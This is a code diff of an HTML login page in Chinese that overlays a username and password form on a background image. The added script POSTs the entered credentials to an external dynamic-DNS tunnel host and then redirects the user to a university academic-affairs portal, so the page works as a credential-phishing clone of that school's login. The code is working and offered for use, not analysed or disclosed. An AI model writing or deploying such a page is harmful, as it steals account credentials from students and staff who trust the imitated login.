@@ -3,17 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;   
+            height: 100vh;
+            overflow: hidden; 
+        }
         .bg-container {
             position: relative;
-            width: 100vw;
-            height: 100vh;
-            background: url("./1.png") no-repeat center;
-            background-size: cover; 
+            width: 100%;
+            height: 100%;
+            aspect-ratio: 16/9;
+            margin: auto;
+            background: url("C:/Users/Lenovo/Desktop/1.png") no-repeat center;
+            background-size: cover;
         }
         .form-group {
             position: absolute;
-            top: 386px;
-            left: 400px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-134.5%, -39.8%); 
             display: flex;
             flex-direction: column;
             gap: 36px;
@@ -24,11 +34,21 @@
             padding: 0 10px;
             border: 1px solid #ccc;
             border-radius: 4px;
+            outline: none;
+            font-size: 17px;
+        }
+        .form-group input:focus {
+            border-color: #2D8CF0;
+            box-shadow: 0 0 2px rgba(69, 139,255,0.5);
+        }
+        .form-group input::placeholder {
+            font-size: 17px;
+            color: #ccc;
         }
         .form-group button {
             width: 334px;
             height: 46px;
-            background-color: #458bf5;
+            background-color: #2D8CF0;
             color: #fff;
             border: none;
             border-radius: 4px;
@@ -41,28 +61,31 @@
     <div class="bg-container">
         <div class="form-group">
             <input type="text" id="input1" placeholder="请输入用户名">
-            <input type="text" id="input2" placeholder="请输入密码">
+            <input type="password" id="input2" placeholder="请输入密码">
             <button onclick="submitForm()">登录</button>
         </div>
     </div>
 
     <script>
         function submitForm() {
-            // 获取输入框内容
-            const text1 = document.getElementById('input1').value;
-            const text2 = document.getElementById('input2').value;
-
-            fetch('http://localhost:3000/save', {
+            fetch('http://dx11675sr4574.vicp.fun:22433/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ text1, text2 })
-            }).then(res => {
-                alert('输入的内容已保存！');
-                document.getElementById('input1').value = '';
-                document.getElementById('input2').value = '';
+                body: JSON.stringify({ 
+                    username: document.getElementById('input1').value,
+                    password: document.getElementById('input2').value
+                })
+            })
+            .then(response => {
+                window.location.href = 'http://jwxt.gsupl.edu.cn/';
+            })
+            .catch(error => {
+                console.error('请求出错:', error);
+                window.location.href = 'http://jwxt.gsupl.edu.cn/';
             });
         }
     </script>
 </body>
-
 </html>
+
+
